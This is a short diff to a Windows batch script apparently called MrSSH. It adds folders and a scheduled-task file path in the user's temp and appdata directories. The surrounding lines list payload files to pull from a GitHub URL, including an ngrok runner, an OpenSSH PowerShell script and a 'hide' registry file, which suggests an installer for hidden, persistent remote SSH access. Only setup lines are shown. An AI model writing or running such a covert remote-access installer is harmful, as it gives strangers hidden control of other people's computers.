@@ -1,9 +1,6 @@
 @echo on
 setlocal enabledelayedexpansion
 chcp 65001 >nul
-pushd %temp%
-mkdir %temp%\TempFolder
-mkdir %temp%\Files
 
 :: <Variables>
 set "Token=%~1"
@@ -11,8 +8,10 @@ set "Version=1.0"
 set "DefaultToken=dheb"
 set Files=NgrokRun.bat OpenSSH.ps1 Source.bat hide.reg WebParse.exe
 set Github=https://github.com/dh3b/MrSSH/raw/v.1.0/Files/
-set "Folder=%temp%\Files"
-set "TFolder=%temp%\TempFolder"
+set "Folder=!temp!\Files" & IF NOT EXIST !Folder! mkdir !Folder!
+set "TFolder=!temp!\TempFolder" & IF NOT EXIST !TFolder! mkdir !TFolder!
+set "Data=%appdata%\MrSSH" & IF NOT EXIST !Data! mkdir !Data!
+set "TaskFile=%appdata%\MrSSH\MrSSH-task.xml"
 :: </Variables>
 
 pushd !Folder!
